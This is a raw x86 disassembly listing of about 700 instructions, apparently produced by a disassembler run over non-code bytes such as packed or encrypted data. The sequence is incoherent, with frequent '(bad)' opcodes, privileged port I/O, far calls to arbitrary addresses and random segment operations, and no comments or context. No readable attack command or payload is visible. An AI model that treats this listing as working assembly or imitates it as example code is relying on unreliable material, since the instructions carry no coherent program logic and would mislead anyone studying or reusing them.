  40f9e5:	div    edx
  40f9e7:	stos   BYTE PTR es:[edi],al
  40f9e8:	(bad)  
  40f9e9:	push   0xffffffe7
  40f9eb:	push   ebp
  40f9ec:	push   cs
  40f9ed:	retf   
  40f9ee:	pop    eax
  40f9ef:	cs addr16 and al,0x27
  40f9f3:	std    
  40f9f4:	add    DWORD PTR [esi],esi
  40f9f6:	(bad)  
  40f9f7:	mov    ch,0x49
  40f9f9:	sub    DWORD PTR ds:0xf4cba2a7,ebx
  40f9ff:	xor    al,0xb6
  40fa01:	xchg   ebx,eax
  40fa02:	sbb    bl,bl
  40fa04:	sbb    dh,dl
  40fa06:	and    DWORD PTR [ecx],esi
  40fa08:	outs   dx,DWORD PTR ds:[esi]
  40fa09:	pop    edx
  40fa0a:	mov    ebp,0x8be940cb
  40fa0f:	sub    ch,bh
  40fa11:	dec    ebx
  40fa12:	or     al,0x6a
  40fa14:	cmp    BYTE PTR [eax],dh
  40fa16:	inc    eax
  40fa17:	dec    edx
  40fa18:	lds    ebx,FWORD PTR [ebx+0x4f751219]
  40fa1e:	cmp    al,cl
  40fa20:	in     al,0x89
  40fa22:	sub    ebx,DWORD PTR [esi-0x12512576]
  40fa28:	add    DWORD PTR [edx],0x60b651f9
  40fa2e:	pop    ds
  40fa2f:	inc    ebx
  40fa30:	cmp    ebp,DWORD PTR [edx-0x1d]
  40fa33:	in     al,dx
  40fa34:	push   cs
  40fa35:	test   BYTE PTR [edi+0x55],0xdd
  40fa39:	sbb    eax,0x5719c29d
  40fa3e:	shr    dh,1
  40fa40:	cwde   
  40fa41:	int3   
  40fa42:	push   ebx
  40fa43:	adc    eax,0xbf581e66
  40fa48:	mov    ebp,0xa885eefd
  40fa4d:	fist   DWORD PTR ds:0xeca23c8e
  40fa53:	out    dx,eax
  40fa54:	aas    
  40fa55:	jns    0x40f9d8
  40fa57:	cmp    edi,DWORD PTR [esi+eiz*8+0x6de39321]
  40fa5e:	mov    ebx,ss
  40fa60:	adc    ecx,eax
  40fa62:	shl    BYTE PTR [edi+0x6e],cl
  40fa65:	xchg   edi,eax
  40fa66:	jl     0x40faa2
  40fa68:	add    ebx,DWORD PTR [esi]
  40fa6a:	mov    dh,0x61
  40fa6c:	pop    eax
  40fa6d:	and    bh,BYTE PTR [esi+eax*8]
  40fa70:	repz fist WORD PTR [ecx+0x32]
  40fa74:	cmp    bl,bl
  40fa76:	cwde   
  40fa77:	lock jl 0x40fa18
  40fa7a:	jp     0x40fa24
  40fa7c:	test   BYTE PTR [eax-0x3],dh
  40fa7f:	pop    ds
  40fa80:	pusha  
  40fa81:	add    bh,BYTE PTR ds:0x4ad13d5b
  40fa87:	adc    BYTE PTR [edi+eiz*1],0x22
  40fa8b:	inc    ebx
  40fa8c:	pushf  
  40fa8d:	inc    eax
  40fa8e:	sti    
  40fa8f:	outs   dx,DWORD PTR ds:[esi]
  40fa90:	(bad)  
  40fa91:	addr16 test eax,0x2f302e69
  40fa97:	or     BYTE PTR [edx],bl
  40fa99:	(bad)  
  40fa9a:	out    dx,eax
  40fa9b:	xchg   ebx,eax
  40fa9c:	jne    0x40faaa
  40fa9e:	ins    BYTE PTR es:[edi],dx
  40fa9f:	mov    esi,0x9647f337
  40faa4:	cwde   
  40faa5:	shl    BYTE PTR [ecx],0x9b
  40faa8:	aad    0xa9
  40faaa:	int    0x48
  40faac:	lea    esi,[eax]
  40faae:	jne    0x40faeb
  40fab0:	fisub  WORD PTR [edx-0x6]
  40fab3:	sbb    DWORD PTR [esi-0x7d],esp
  40fab6:	ja     0x40fb05
  40fab8:	adc    al,0xfe
  40faba:	mov    dl,BYTE PTR [ebp+0x16]
  40fabd:	mov    ebp,0x80d1c9d3
  40fac2:	pop    eax
  40fac3:	test   al,0x2d
  40fac5:	push   ss
  40fac6:	in     eax,dx
  40fac7:	push   eax
  40fac8:	mov    ah,0x17
  40faca:	jl     0x40fab5
  40facc:	stos   BYTE PTR es:[edi],al
  40facd:	stc    
  40face:	in     eax,dx
  40facf:	push   0xffffffa8
  40fad1:	cmp    eax,DWORD PTR [ecx]
  40fad3:	mov    ah,0x41
  40fad5:	push   0xffffff8b
  40fad7:	test   DWORD PTR [edi],ebp
  40fad9:	imul   esi,DWORD PTR [ebx-0x43142c0e],0xffffffc8
  40fae0:	sbb    BYTE PTR [ecx+esi*8+0x3a],ah
  40fae4:	call   0xf678:0x48fc352
  40faeb:	fnsave [ebx-0x7d]
  40faee:	in     al,0x3a
  40faf0:	stos   BYTE PTR es:[edi],al
  40faf1:	mov    ebx,0x18bba78f
  40faf6:	sub    esp,eax
  40faf8:	fcom   QWORD PTR [edx]
  40fafa:	mov    al,0x15
  40fafc:	loopne 0x40faef
  40fafe:	pop    es
  40faff:	jmp    0x40fb6b
  40fb01:	test   eax,0x6356372
  40fb06:	cmp    al,0x45
  40fb08:	sbb    al,0x3
  40fb0a:	rcl    BYTE PTR [ecx-0x6afac8a],cl
  40fb10:	pop    ebx
  40fb11:	pusha  
  40fb12:	mov    eax,0xb6bd0f8b
  40fb17:	xchg   edx,eax
  40fb18:	sti    
  40fb19:	xchg   esp,eax
  40fb1a:	sbb    DWORD PTR [ecx+0x69c8250e],eax
  40fb20:	push   ebx
  40fb21:	xchg   ecx,eax
  40fb22:	add    al,0xc3
  40fb24:	lds    ecx,FWORD PTR [ecx+eiz*2]
  40fb27:	sbb    eax,0xe696b703
  40fb2c:	add    esi,esi
  40fb2e:	mov    esp,0x80863580
  40fb33:	mov    esi,0xf8aaab0
  40fb38:	inc    ebx
  40fb39:	and    DWORD PTR [edi+0x4b6b82a0],ebx
  40fb3f:	out    dx,eax
  40fb40:	loop   0x40fb0c
  40fb42:	dec    ecx
  40fb43:	call   0x16b7a9fd
  40fb48:	add    DWORD PTR [ebp+0x6b],ecx
  40fb4b:	xchg   BYTE PTR [edx-0x3d],ah
  40fb4e:	sub    DWORD PTR [edx],ecx
  40fb50:	hlt    
  40fb51:	sub    eax,esi
  40fb53:	mov    ds:0xd117df6c,eax
  40fb58:	out    0xb2,al
  40fb5a:	mov    ax,0xe483
  40fb5e:	xchg   ecx,eax
  40fb5f:	pushf  
  40fb60:	pop    eax
  40fb61:	test   DWORD PTR [esi+edi*1+0x63d78110],edi
  40fb68:	sbb    esi,DWORD PTR [ebx]
  40fb6a:	call   0x3807:0xd1a020b7
  40fb71:	fld    DWORD PTR [eax+eiz*1]
  40fb74:	fnstsw WORD PTR [edi]
  40fb76:	retf   
  40fb77:	xchg   BYTE PTR [ecx-0x4a],bh
  40fb7a:	aad    0x73
  40fb7c:	push   esi
  40fb7d:	xchg   DWORD PTR [esi+0x7c],eax
  40fb80:	in     eax,dx
  40fb81:	sub    BYTE PTR ds:0x4ab53b76,al
  40fb87:	loop   0x40fb25
  40fb89:	mov    cl,0xef
  40fb8b:	imul   ebx,DWORD PTR [ebx],0xf63bde04
  40fb91:	fwait
  40fb92:	jge    0x40fbc1
  40fb94:	call   0xc3116e69
  40fb99:	and    dh,BYTE PTR [ecx-0x176bd671]
  40fb9f:	lahf   
  40fba0:	iret   
  40fba1:	fwait
  40fba2:	sbb    eax,0x49af1c78
  40fba7:	adc    dl,0x24
  40fbaa:	enter  0x2e19,0xb3
  40fbae:	add    ebp,ecx
  40fbb0:	sbb    ch,BYTE PTR [edx]
  40fbb2:	or     edi,ecx
  40fbb4:	and    ebx,ebx
  40fbb6:	popa   
  40fbb7:	inc    eax
  40fbb8:	dec    esi
  40fbb9:	out    0xe7,eax
  40fbbb:	push   ds
  40fbbc:	test   al,0x98
  40fbbe:	out    dx,al
  40fbbf:	dec    eax
  40fbc0:	cmp    esi,eax
  40fbc2:	push   edi
  40fbc3:	rcl    edi,cl
  40fbc5:	fstp   DWORD PTR [esi]
  40fbc7:	les    esp,FWORD PTR [edx+0x7b]
  40fbca:	push   ecx
  40fbcb:	imul   ebx,DWORD PTR [esi],0xb57ada78
  40fbd1:	repnz push edx
  40fbd3:	icebp  
  40fbd4:	cdq    
  40fbd5:	pushf  
  40fbd6:	std    
  40fbd7:	retf   0xcee5
  40fbda:	out    dx,eax
  40fbdb:	mov    ecx,0x27e97857
  40fbe0:	test   eax,0x69d5e904
  40fbe5:	adc    ebp,esi
  40fbe7:	fcmove st,st(4)
  40fbe9:	mov    esp,0x2b47795c
  40fbee:	sub    esi,edx
  40fbf0:	inc    esp
  40fbf1:	jne    0x40fbbf
  40fbf3:	sub    bl,BYTE PTR [ebx-0xb985f33]
  40fbf9:	js     0x40fc14
  40fbfb:	pop    edx
  40fbfc:	adc    ebx,DWORD PTR [ebp+eax*4-0x5edd01a4]
  40fc03:	repnz stos DWORD PTR es:[edi],eax
  40fc05:	scas   al,BYTE PTR es:[edi]
  40fc06:	out    dx,al
  40fc07:	adc    BYTE PTR [edx-0x1d],al
  40fc0a:	loope  0x40fc33
  40fc0c:	jmp    0x40fba0
  40fc0e:	rcl    DWORD PTR [ecx+0x1b],0x20
  40fc12:	push   ebp
  40fc13:	push   0x18e98002
  40fc18:	xor    eax,0x15b2e192
  40fc1d:	aas    
  40fc1e:	mov    gs,WORD PTR ds:[ecx]
  40fc21:	xor    eax,0x3014855a
  40fc26:	push   ecx
  40fc27:	ds cmp dh,ch
  40fc2a:	cli    
  40fc2b:	push   ecx
  40fc2c:	gs aad 0x97
  40fc2f:	in     al,dx
  40fc30:	or     eax,0x966f0f5a
  40fc35:	mov    ecx,0x2c69a39
  40fc3a:	mov    ch,0xed
  40fc3c:	sub    eax,0x59a28900
  40fc41:	fisubr DWORD PTR [ebp+eiz*4-0x5d]
  40fc45:	pop    ds
  40fc46:	pop    esp
  40fc47:	and    al,0xdf
  40fc49:	add    BYTE PTR [esi],al
  40fc4b:	xchg   esp,eax
  40fc4c:	in     eax,0x42
  40fc4e:	sub    eax,0xc98f94cc
  40fc53:	ss jno 0x40fc25
  40fc56:	jle    0x40fcaf
  40fc58:	lea    esp,[edi-0x79]
  40fc5b:	gs inc ecx
  40fc5d:	inc    edx
  40fc5e:	pop    eax
  40fc5f:	bound  ebp,QWORD PTR [esi-0x53aba49b]
  40fc65:	test   eax,0xe4ba6b8e
  40fc6a:	ins    BYTE PTR es:[edi],dx
  40fc6b:	pop    ecx
  40fc6c:	in     eax,0x2a
  40fc6e:	cld    
  40fc6f:	xor    al,0x8d
  40fc71:	or     al,dh
  40fc73:	or     edx,edi
  40fc75:	sar    al,1
  40fc77:	push   eax
  40fc78:	in     eax,dx
  40fc79:	enter  0xd55a,0x8b
  40fc7d:	xchg   ebx,eax
  40fc7e:	mov    ch,0x58
  40fc80:	outs   dx,BYTE PTR ds:[esi]
  40fc81:	inc    ecx
  40fc82:	sbb    dh,BYTE PTR [ebp+0x69]
  40fc85:	mov    ecx,0xeadfcea5
  40fc8a:	or     eax,ecx
  40fc8c:	jg     0x40fc80
  40fc8e:	scas   al,BYTE PTR es:[edi]
  40fc8f:	fdivp  st(1),st
  40fc91:	fwait
  40fc92:	dec    eax
  40fc93:	and    eax,0x331921af
  40fc98:	dec    esi
  40fc99:	or     DWORD PTR [eax+edx*1],0xffffffeb
  40fc9d:	add    BYTE PTR [eax-0x7f],cl
  40fca0:	mov    esp,0xd97f38d8
  40fca5:	adc    ebp,ebx
  40fca7:	mov    bl,0x39
  40fca9:	sub    al,0x7c
  40fcab:	mov    al,ds:0x206f7561
  40fcb0:	fwait
  40fcb1:	idiv   esi
  40fcb3:	and    esi,ebx
  40fcb5:	mov    esi,DWORD PTR [esi+ebx*2+0x7b]
  40fcb9:	xchg   ecx,eax
  40fcba:	ss pop ebp
  40fcbc:	(bad)  
  40fcbd:	mov    esi,DWORD PTR [ebx+ebx*8]
  40fcc0:	sbb    al,0xac
  40fcc2:	push   ebp
  40fcc3:	pop    ss
  40fcc4:	rcr    DWORD PTR [ebx],1
  40fcc6:	xchg   ebx,eax
  40fcc7:	clc    
  40fcc8:	jl     0x40fc8a
  40fcca:	adc    dl,dh
  40fccc:	pop    ecx
  40fccd:	nop
  40fcce:	jg     0x40fc5d
  40fcd0:	adc    DWORD PTR [ecx+0x41],esi
  40fcd3:	sbb    esi,esp
  40fcd5:	sub    eax,0x3582a570
  40fcda:	sti    
  40fcdb:	xchg   edx,eax
  40fcdc:	gs loop 0x40fcc4
  40fcdf:	popa   
  40fce0:	fadd   QWORD PTR [ebp+ecx*8-0x652ef5ae]
  40fce7:	mov    bl,0xa5
  40fce9:	xchg   edx,eax
  40fcea:	jmp    0x40fd58
  40fcec:	repz mov ebx,0xa59d57d3
  40fcf2:	call   0x99501dab
  40fcf7:	mov    bh,BYTE PTR [ebx]
  40fcf9:	gs pop ss
  40fcfb:	adc    DWORD PTR [eax+0x77],ecx
  40fcfe:	mov    ah,BYTE PTR [ebx-0x708f7dcb]
  40fd04:	scas   eax,DWORD PTR es:[edi]
  40fd05:	outs   dx,DWORD PTR ds:[esi]
  40fd06:	in     al,dx
  40fd07:	ds ret 0xa99d
  40fd0b:	lea    ecx,ds:0x47e09f5f
  40fd11:	mov    WORD PTR [esi-0x24f802ae],?
  40fd17:	bnd jbe 0x40fd7a
  40fd1a:	in     eax,dx
  40fd1b:	mov    bl,0xf1
  40fd1d:	xchg   DWORD PTR [esi+eax*4-0x9],ecx
  40fd21:	pop    edx
  40fd22:	call   0xc0d2d68
  40fd27:	xor    bl,bl
  40fd29:	ror    ch,cl
  40fd2b:	pop    ebp
  40fd2c:	and    al,0xbc
  40fd2e:	jge    0x40fd1c
  40fd30:	sbb    al,bl
  40fd32:	adc    ch,al
  40fd34:	sbb    eax,DWORD PTR [edi]
  40fd36:	or     eax,0xc9f65b80
  40fd3b:	and    bl,BYTE PTR [ebp-0x3b9a242d]
  40fd41:	and    esp,ebx
  40fd43:	sbb    eax,DWORD PTR [eax]
  40fd45:	gs enter 0xa9ae,0x43
  40fd4a:	pop    eax
  40fd4b:	pop    cx
  40fd4d:	sbb    eax,0x611faf2b
  40fd52:	push   edx
  40fd53:	in     al,0x41
  40fd55:	sbb    ecx,DWORD PTR [ecx+0x71f4e898]
  40fd5b:	(bad)  
  40fd5c:	jp     0x40fd32
  40fd5e:	dec    esi
  40fd5f:	daa    
  40fd60:	or     cl,BYTE PTR [ebx-0x73]
  40fd63:	ret    0xe444
  40fd66:	dec    edx
  40fd67:	out    0xe7,al
  40fd69:	jae    0x40fdb4
  40fd6b:	mov    eax,0xe6ad0a6b
  40fd70:	out    0x2f,al
  40fd72:	stc    
  40fd73:	push   ecx
  40fd74:	cld    
  40fd75:	and    DWORD PTR [ebp-0x4ce4670a],ebx
  40fd7b:	scas   al,BYTE PTR es:[edi]
  40fd7c:	das    
  40fd7d:	adc    BYTE PTR [esi+0x4b76c673],0xcb
  40fd84:	xchg   esi,eax
  40fd85:	dec    ebp
  40fd86:	int3   
  40fd87:	mov    BYTE PTR [eax+edi*2],dh
  40fd8a:	in     al,dx
  40fd8b:	mov    edx,0xaa7161c6
  40fd90:	int3   
  40fd91:	push   0xffffffa4
  40fd93:	cli    
  40fd94:	cmc    
  40fd95:	dec    ecx
  40fd96:	mov    bl,0xe2
  40fd98:	mov    ?,esi
  40fd9a:	xchg   esp,eax
  40fd9b:	dec    ecx
  40fd9c:	mov    ds:0x6ff98229,al
  40fda1:	or     ebx,DWORD PTR [eax-0x65cf5e2]
  40fda7:	inc    ebp
  40fda8:	pop    ss
  40fda9:	jns    0x40fdc2
  40fdab:	out    dx,al
  40fdac:	fs mov ecx,0x13bb0811
  40fdb2:	xlat   BYTE PTR ds:[ebx]
  40fdb3:	gs jno 0x40fde7
  40fdb6:	or     DWORD PTR [esi],esp
  40fdb8:	cmp    dh,BYTE PTR [edx]
  40fdba:	cld    
  40fdbb:	cli    
  40fdbc:	mov    al,0x92
  40fdbe:	inc    edi
  40fdbf:	mov    ebx,0xbe7ca793
  40fdc4:	sub    DWORD PTR [ebx-0x73132eb4],ecx
  40fdca:	sbb    bl,BYTE PTR [esi+0x5e46ac4a]
  40fdd0:	pop    es
  40fdd1:	pop    esi
  40fdd2:	push   ds
  40fdd3:	loope  0x40fe16
  40fdd5:	sub    BYTE PTR [edx+ebp*4],dl
  40fdd8:	sub    DWORD PTR [ebp-0x1d],ebp
  40fddb:	inc    edx
  40fddc:	das    
  40fddd:	jp     0x40fe4a
  40fddf:	imul   esp,DWORD PTR [ebx],0x89e5090b
  40fde5:	dec    ecx
  40fde6:	ss cwde 
  40fde8:	and    al,0xd9
  40fdea:	pop    ebp
  40fdeb:	jo     0x40fe17
  40fded:	jae    0x40fdc7
  40fdef:	loope  0x40fe40
  40fdf1:	adc    eax,0xdea74411
  40fdf6:	inc    edx
  40fdf7:	and    edi,0x6a5904fd
  40fdfd:	fwait
  40fdfe:	sahf   
  40fdff:	jl     0x40fe71
  40fe01:	mov    bl,0xdb
  40fe03:	or     DWORD PTR [edi-0x30],0xa011f9e
  40fe0a:	fmul   DWORD PTR es:[edx*4-0x2070f7f2]
  40fe12:	outs   dx,BYTE PTR ds:[esi]
  40fe13:	xor    ebx,edx
  40fe15:	out    dx,eax
  40fe16:	addr16 xor dh,dh
  40fe19:	loop   0x40fdde
  40fe1b:	fld    QWORD PTR [edx+0x4e]
  40fe1e:	mov    bh,0x38
  40fe20:	xchg   esi,eax
  40fe21:	cld    
  40fe22:	into   
  40fe23:	popa   
  40fe24:	xchg   esp,eax
  40fe25:	xor    al,0x88
  40fe27:	nop
  40fe28:	adc    edi,DWORD PTR [edi+0x46]
  40fe2b:	out    0x33,eax
  40fe2d:	mov    edi,0x428c6d22
  40fe32:	sub    eax,0x4ecca49
  40fe37:	cmp    DWORD PTR ds:0x51855506,ebx
  40fe3d:	aaa    
  40fe3e:	adc    al,al
  40fe40:	mov    edx,0xc788f278
  40fe45:	mov    edx,0xa99b62eb
  40fe4a:	dec    eax
  40fe4b:	daa    
  40fe4c:	mov    edx,esp
  40fe4e:	(bad)  
  40fe4f:	cmp    DWORD PTR [esi],edx
  40fe51:	dec    eax
  40fe52:	(bad)  ds:0xe14be50f
  40fe58:	inc    edx
  40fe59:	ficom  DWORD PTR [eax+ebx*1+0xab70cd2]
  40fe60:	fisttp QWORD PTR [edx]
  40fe62:	sti    
  40fe63:	retf   0xc6
  40fe66:	pop    eax
  40fe67:	add    BYTE PTR [edx+eiz*4],al
  40fe6a:	push   ds
  40fe6b:	mov    cl,0xc1
  40fe6d:	dec    ecx
  40fe6e:	jl     0x40fe27
  40fe70:	ins    BYTE PTR es:[edi],dx
  40fe71:	loop   0x40fe3d
  40fe73:	outs   dx,BYTE PTR ds:[esi]
  40fe74:	pop    edx
  40fe75:	sar    DWORD PTR [ecx+0x32],1
  40fe78:	fistp  WORD PTR [ebx]
  40fe7a:	je     0x40fe93
  40fe7c:	cmp    al,0xe8
  40fe7e:	repz in eax,0x81
  40fe81:	(bad)  
  40fe82:	pop    eax
  40fe83:	ret    0x13b9
  40fe86:	outs   dx,DWORD PTR ds:[esi]
  40fe87:	mov    esi,0xee879629
  40fe8c:	shl    BYTE PTR [ebp+0x3d],0x73
  40fe90:	push   edx
  40fe91:	dec    ecx
  40fe92:	ss repz ret 
  40fe95:	daa    
  40fe96:	jnp    0x40fe4a
  40fe98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe99:	(bad)  
  40fe9a:	in     al,dx
  40fe9b:	sub    DWORD PTR [eax+0x134cc8d8],edx
  40fea1:	bound  esi,QWORD PTR [esi-0x52]
  40fea4:	arpl   WORD PTR [esi-0x31],si
  40fea7:	sub    BYTE PTR [edi],bh
  40fea9:	push   DWORD PTR [edx+0x5d4ed964]
  40feaf:	out    0xf2,eax
  40feb1:	sahf   
  40feb2:	pop    esp
  40feb3:	shl    al,cl
  40feb5:	int    0xd5
  40feb7:	retf   0x4401
  40feba:	push   edx
  40febb:	mov    ebx,0xcc9ce768
  40fec0:	nop
  40fec1:	jg     0x40fe48
  40fec3:	xchg   edi,eax
  40fec4:	cmp    ebx,DWORD PTR [esi+edx*1-0x39]
  40fec8:	(bad)  
  40fec9:	lods   al,BYTE PTR ds:[esi]
  40feca:	mov    bh,0x7a
  40fecc:	les    esp,FWORD PTR [esi]
  40fece:	cmp    eax,DWORD PTR [ebx]
  40fed0:	cmp    ecx,0xffffff89
  40fed3:	pop    ecx
  40fed4:	pushf  
  40fed5:	pop    es
  40fed6:	les    edx,FWORD PTR [eax-0xe5531f4]
  40fedc:	cmp    al,0x51
  40fede:	sub    eax,0x2f4d819c
  40fee3:	inc    esp
  40fee4:	or     al,bh
  40fee6:	call   0x731f:0x771a14ea
  40feed:	ja     0x40feb4
  40feef:	sub    bh,cl
  40fef1:	ins    DWORD PTR es:[edi],dx
  40fef2:	pop    edx
  40fef3:	ficomp WORD PTR [eax]
  40fef5:	ins    DWORD PTR es:[edi],dx
  40fef6:	xlat   BYTE PTR ds:[ebx]
  40fef7:	mov    DWORD PTR [ecx-0x3ff33842],0xf78515de
  40ff01:	retf   0x894f
  40ff04:	cwde   
  40ff05:	pop    ebx
  40ff06:	xchg   edi,eax
  40ff07:	ret    
  40ff08:	inc    ecx
  40ff09:	pusha  
  40ff0a:	(bad)  
  40ff0b:	inc    edx
  40ff0d:	inc    ecx
  40ff0e:	mov    ds:0x3df3ccd7,eax
  40ff13:	push   0x16
  40ff15:	ds in  al,dx
  40ff17:	imul   esp,DWORD PTR [ebp+0x20],0x353b649b
  40ff1e:	push   0x817e4565
  40ff23:	stos   DWORD PTR es:[edi],eax
  40ff24:	lds    edi,FWORD PTR [edx]
  40ff26:	stos   BYTE PTR es:[edi],al
  40ff27:	sbb    ebp,DWORD PTR [esi+0x69]
  40ff2a:	sub    edx,DWORD PTR [ebx+0x24]
  40ff2d:	leave  
  40ff2e:	adc    ebp,DWORD PTR [eax-0x1c48a72b]
  40ff34:	sahf   
  40ff35:	add    DWORD PTR [edx-0x3d],ecx
  40ff38:	pushf  
  40ff39:	or     ch,BYTE PTR [eax-0x19]
  40ff3c:	das    
  40ff3d:	and    bl,ah
  40ff3f:	addr16 pop edx
  40ff41:	(bad)  
  40ff43:	fist   DWORD PTR [ecx]
  40ff45:	xchg   ebp,eax
  40ff46:	inc    edx
  40ff47:	mov    bh,0x5b
  40ff49:	lds    eax,FWORD PTR [ebp-0x7c]
  40ff4c:	mov    WORD PTR [edx-0x75],gs
  40ff4f:	or     bl,BYTE PTR [esi+0x46]
  40ff52:	neg    DWORD PTR [ecx+0x19]
  40ff55:	cwde   
  40ff56:	mov    BYTE PTR [esi],dh
  40ff58:	push   0x6b366002
  40ff5d:	mov    ch,0x3b
  40ff5f:	or     cl,cl
  40ff61:	xor    al,0x5a
  40ff63:	xlat   BYTE PTR ds:[ebx]
  40ff64:	sbb    eax,0xf7db5abc
  40ff69:	sub    al,0x97
  40ff6b:	add    bl,0x23
  40ff6e:	js     0x40ff3a
  40ff70:	push   eax
  40ff71:	test   eax,0x2f6bc8c0
  40ff76:	xchg   ebx,eax
  40ff77:	pop    esi
  40ff78:	dec    ebx
  40ff79:	and    eax,0x11800e60
  40ff7e:	dec    ebp
  40ff7f:	or     al,0xae
  40ff81:	aaa    
  40ff82:	add    BYTE PTR [edx+0x5b9477b3],al
  40ff88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff89:	jecxz  0x40ffc4
  40ff8b:	pop    eax
  40ff8c:	out    dx,al
  40ff8d:	mov    BYTE PTR [edx],dl
  40ff8f:	mov    esp,0xf96acae6
  40ff94:	adc    al,0x8b
  40ff96:	mov    WORD PTR ss:[bp-0x44],?
  40ff9b:	ret    0xba48
  40ff9e:	pop    es
  40ff9f:	imul   eax,DWORD PTR [esi+0x3481669],0x847c9a5b
  40ffa9:	ss mov esp,0x86e8acea
  40ffaf:	jbe    0x40ff70
  40ffb1:	or     eax,0x3890ef7
  40ffb6:	fs add ah,bl
  40ffb9:	mov    fs,ecx
  40ffbb:	fld    st(0)
  40ffbd:	mov    bh,0x8e
  40ffbf:	dec    esi
  40ffc0:	xchg   ecx,eax
  40ffc1:	imul   ecx,ecx,0x38
  40ffc4:	aas    
  40ffc5:	mov    ah,0xe9
  40ffc7:	xchg   ebx,eax
  40ffc8:	add    eax,0x9084b741
  40ffcd:	and    ebp,eax
  40ffcf:	in     eax,dx
  40ffd0:	xchg   edi,eax
  40ffd1:	fs scas al,BYTE PTR es:[edi]
  40ffd3:	(bad)  
  40ffd5:	jnp    0x41001f
  40ffd7:	call   0x84b9b55f
  40ffdc:	mov    ch,0x27
  40ffde:	pushf  
  40ffdf:	mov    esi,0xb2cc3930
  40ffe4:	lods   eax,DWORD PTR ds:[esi]
  40ffe5:	fcmovnb st,st(7)
  40ffe7:	jmp    0xda58:0x3457227c
  40ffee:	inc    ebx
  40ffef:	in     al,0xe8
  40fff1:	pop    edi
  40fff2:	mov    ah,0x32
  40fff4:	int    0xf0
  40fff6:	mov    dh,0x88
  40fff8:	mov    edi,0x1331d04d
  40fffd:	or     edi,DWORD PTR [edi-0x79895e0f]
  410003:	repz stc 
  410005:	jecxz  0x41005c
  410007:	outs   dx,DWORD PTR ds:[esi]
  410008:	retf   
  410009:	in     eax,0xec
  41000b:	aas    
  41000c:	jnp    0x40ff9b
  41000e:	gs out 0x2b,eax
  410011:	rcl    DWORD PTR [ebx],1
  410013:	add    DWORD PTR ds:0xb8057433,eax
  410019:	pop    esp
  41001a:	cwde   
  41001b:	mov    dh,0xd5
  41001d:	sub    al,0x6d
  41001f:	or     BYTE PTR [edi-0xa45e0e0],bl
  410025:	jle    0x41006c
  410027:	or     edx,DWORD PTR [ebx+0x4013b618]
  41002d:	mov    ebp,DWORD PTR [ebx]
  41002f:	(bad)  
  410030:	icebp  
  410031:	add    BYTE PTR [edx+ebx*1-0xa],0x12
  410036:	sub    DWORD PTR [eax+0x434a2bde],0x5e777575
  410040:	mov    eax,ds:0x940c9a48
  410045:	xchg   edi,eax
  410046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410047:	pusha  
  410048:	inc    esi
  410049:	push   0x5611eb6
  41004e:	lods   eax,DWORD PTR ds:[esi]
  41004f:	jb     0x41006d
  410051:	jecxz  0x4100c3
  410053:	mov    eax,0x34bd9c5e
  410058:	stc    
  410059:	and    esi,DWORD PTR [esi-0x1ae78ef3]
  41005f:	sbb    DWORD PTR [ebp-0x552c2763],ecx
  410065:	pop    ss
  410066:	mov    dl,0x77
  410068:	inc    ecx
  410069:	(bad)  
  41006a:	setle  BYTE PTR [eax+0x7daebe91]
  410071:	mov    esp,0xc0ba5f68
  410076:	cmp    DWORD PTR [eax+0x737cf6bb],ebx
  41007c:	hlt    
  41007d:	shr    BYTE PTR [eax+0x2],1
  410080:	and    esi,0xffffff9d
  410083:	test   al,0x78
  410085:	xor    al,0xa2
  410087:	push   ds
  410088:	mov    ds:0x7bdce239,eax
  41008d:	or     BYTE PTR [edi-0x7cab9487],ch
  410093:	mov    eax,0xa9aff1a9
  410098:	stos   DWORD PTR es:[edi],eax
  410099:	popf   
  41009a:	nop
  41009b:	cmp    DWORD PTR ds:[esi-0x68],ebp
  41009f:	shl    DWORD PTR [eax+0x46],0xa4
  4100a3:	nop
  4100a4:	fs in  eax,dx
  4100a6:	inc    ecx
  4100a7:	mov    al,ds:0xd9d99876
  4100ac:	loopne 0x41005f
  4100ae:	aad    0x62
  4100b0:	(bad)  [ebx+esi*1]
  4100b3:	aam    0xd1
  4100b5:	sbb    edi,ebx
  4100b7:	imul   eax,DWORD PTR [eax-0x4c],0x10ffb5bb
  4100be:	cmp    ebp,DWORD PTR [ebp+0x29d6af22]
  4100c4:	stos   BYTE PTR es:[edi],al
  4100c5:	pop    ebp
  4100c6:	(bad)  
  4100c7:	mov    bh,0x30
  4100c9:	cdq    
  4100ca:	fisttp QWORD PTR [edi+eax*8+0x64]
  4100ce:	mov    dh,BYTE PTR [edx]
  4100d0:	inc    edi
  4100d1:	adc    edi,ecx
  4100d3:	mov    ah,0x14
  4100d5:	cmp    ch,BYTE PTR ss:[edx-0x7778f370]
  4100dc:	adc    al,0x27
  4100de:	cmp    edi,ebp
  4100e0:	ins    DWORD PTR es:[edi],dx
  4100e1:	fwait
  4100e2:	inc    ebp
  4100e3:	pop    esi
  4100e4:	mov    dh,BYTE PTR [esi+eax*2]
  4100e7:	(bad)  
  4100e8:	mov    BYTE PTR [edx-0x16a9ecf7],dl
  4100ee:	idiv   DWORD PTR [edx-0x1e]
  4100f1:	arpl   WORD PTR [ebx-0xb],ax
  4100f4:	out    dx,eax
  4100f5:	mov    esi,0x4edf0973
  4100fa:	inc    DWORD PTR [edi-0x72]
  4100fd:	xlat   BYTE PTR ds:[ebx]
  4100fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100ff:	imul   ecx,DWORD PTR [ecx+0x34271d7a],0x1d
  410106:	mov    esp,0x2cd28b95
  41010b:	retf   
  41010c:	xchg   esp,eax
  41010d:	cli    
  41010e:	outs   dx,BYTE PTR ds:[esi]
  41010f:	imul   BYTE PTR [esi+0x69f17ec3]
  410115:	xchg   bl,ah
  410117:	sti    
  410118:	nop
  410119:	div    BYTE PTR [edx+0x799e07d7]
  41011f:	out    dx,al
  410120:	xor    al,BYTE PTR [eax+ebx*1]
  410123:	std    
  410124:	enter  0xdfff,0x2b
  410128:	cmp    BYTE PTR [ebx-0x3e],dl
  41012b:	fabs   
  41012d:	in     eax,0xe6
  41012f:	dec    edx
  410130:	add    edi,DWORD PTR [ebx]
  410132:	in     eax,0xa2
  410134:	test   eax,0x52b7142a
  410139:	and    ecx,DWORD PTR [esi-0x7a]
  41013c:	clc    
  41013d:	ja     0x410116
  41013f:	std    
  410140:	xchg   esp,eax
  410141:	pusha  
  410142:	push   esp
  410143:	in     eax,0xf
  410145:	pop    eax
